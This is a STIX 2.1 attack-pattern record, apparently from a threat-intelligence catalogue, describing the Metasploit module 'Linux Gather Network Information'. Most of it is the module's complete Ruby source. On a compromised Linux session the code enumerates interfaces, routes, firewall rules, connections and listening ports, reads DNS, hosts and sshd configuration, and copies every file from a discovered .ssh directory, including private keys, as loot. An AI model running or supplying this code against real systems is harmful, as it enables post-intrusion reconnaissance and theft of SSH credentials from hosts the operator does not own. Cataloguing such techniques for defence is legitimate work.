{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f4e7002-20c0-4f15-b1c5-19e2c96e7d85",
    "created": "2024-08-14T16:33:17.986251Z",
    "modified": "2024-08-14T16:33:17.986255Z",
    "name": "Linux Gather Network Information",
    "description": " This module gathers network information from the target system IPTables rules, interfaces, wireless information, open and listening ports, active network connections, DNS information and SSH information.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_network.rb",
            "external_id": "enum_network.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather Network Information',\n        'Description' => %q{\n          This module gathers network information from the target system\n          IPTables rules, interfaces, wireless information, open and listening\n          ports, active network connections, DNS information and SSH information.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ohdae <bindshell[at]live.com>', # minor additions, modifications & testing\n          'Stephen Haywood <averagesecurityguy[at]gmail.com>', # enum_linux\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{get_hostname} (#{session.session_host})\")\n\n    user = execute('/usr/bin/whoami')\n    print_status(\"Module running as #{user}\")\n\n    # Collect data\n    distro = get_sysinfo\n    print_good('Info:')\n    print_good(\"\\t#{distro[:version]}\")\n    print_good(\"\\t#{distro[:kernel]}\")\n\n    print_status('Collecting data...')\n\n    nconfig = execute('/sbin/ifconfig -a')\n    routes = execute('/sbin/route -e')\n    iptables = execute('/sbin/iptables -L')\n    iptables_nat = execute('/sbin/iptables -L -t nat')\n    iptables_man = execute('/sbin/iptables -L -t mangle')\n    resolv = cat_file('/etc/resolv.conf')\n    sshd_conf = cat_file('/etc/ssh/sshd_config')\n    hosts = cat_file('/etc/hosts')\n    connections = execute('/usr/bin/lsof -nPi')\n    wireless = execute('/sbin/iwconfig')\n    open_ports = execute('/bin/netstat -tulpn')\n    updown = execute('ls -R /etc/network')\n\n    ssh_keys = get_ssh_keys\n\n    # Save Enumerated data\n    save('Network config', nconfig)\n    save('Route table', routes)\n    save('Firewall config', iptables.to_s + iptables_nat.to_s + iptables_man.to_s)\n    save('DNS config', resolv)\n    save('SSHD config', sshd_conf)\n    save('Host file', hosts)\n    save('SSH keys', ssh_keys) unless ssh_keys.empty?\n    save('Active connections', connections)\n    save('Wireless information', wireless)\n    save('Listening ports', open_ports)\n    save('If-Up/If-Down', updown)\n  end\n\n  # Save enumerated data\n  def save(msg, data, ctype = 'text/plain')\n    unless data && !data.empty?\n      print_bad(\"Unable to get data for #{msg}\")\n      return\n    end\n    ltype = 'linux.enum.network'\n    loot = store_loot(ltype, ctype, session, data, nil, msg)\n    print_good(\"#{msg} stored in #{loot}\")\n  end\n\n  def execute(cmd)\n    verification_token = Rex::Text.rand_text_alpha(8)\n    vprint_status(\"Execute: #{cmd}\")\n    output = cmd_exec(cmd + \" || echo #{verification_token}\")\n    return nil if output.include?(verification_token)\n\n    return output\n  end\n\n  def cat_file(filename)\n    vprint_status(\"Download: #{filename}\")\n    output = read_file(filename)\n    return output\n  end\n\n  def get_ssh_keys\n    keys = []\n\n    # Look for .ssh folder, \"~/\" might not work everytime\n    vprint_status('Execute: /usr/bin/find / -maxdepth 3 -name .ssh')\n    dirs = cmd_exec('/usr/bin/find / -maxdepth 3 -name .ssh').split(\"\\n\")\n    ssh_base = ''\n    dirs.each do |d|\n      if d =~ %r{(^/)(.*)\\.ssh$}\n        ssh_base = d\n        break\n      end\n    end\n\n    # We didn't find .ssh :-(\n    return [] if ssh_base == ''\n\n    # List all the files under .ssh/\n    files = execute(\"/bin/ls -a #{ssh_base}\").chomp.split\n\n    files.each do |k|\n      next if k =~ /^(\\.+)$/\n\n      this_key = cat_file(\"#{ssh_base}/#{k}\")\n      keys << this_key\n    end\n\n    return keys\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}